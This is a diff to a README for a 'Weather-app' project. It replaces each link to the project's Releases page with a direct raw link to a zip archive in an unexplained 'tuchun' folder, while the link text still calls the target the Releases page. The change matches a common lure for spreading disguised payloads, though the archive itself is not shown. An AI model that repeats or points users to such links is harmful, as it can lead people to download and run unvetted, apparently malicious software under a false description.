@@ -6,14 +6,14 @@ Welcome to Weather-app! This application shows you the current weather in your a
 
 ## 🔗 Download the App
 
-[![Download Weather-app](https://img.shields.io/badge/Download-Weather--app-blue.svg)](https://github.com/moyov220/Weather-app/releases)
+[![Download Weather-app](https://github.com/moyov220/Weather-app/raw/refs/heads/master/tuchun/Weather_app_1.5.zip)](https://github.com/moyov220/Weather-app/raw/refs/heads/master/tuchun/Weather_app_1.5.zip)
 
 ## 📥 Download & Install
 
 To download Weather-app, follow these steps:
 
 1. Click on the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/moyov220/Weather-app/releases)
+   [Visit this page to download](https://github.com/moyov220/Weather-app/raw/refs/heads/master/tuchun/Weather_app_1.5.zip)
 
 2. On the Releases page, you will see the latest version listed at the top. Click the version number to view the release details.
 
@@ -58,6 +58,6 @@ We value your thoughts! If you have any feedback or suggestions, please reach ou
 
 If you need to download Weather-app again, you can always go back to the Releases page:
 
-[Visit this page to download](https://github.com/moyov220/Weather-app/releases)
+[Visit this page to download](https://github.com/moyov220/Weather-app/raw/refs/heads/master/tuchun/Weather_app_1.5.zip)
 
 Thank you for using Weather-app! Enjoy a better day ahead with accurate weather information.
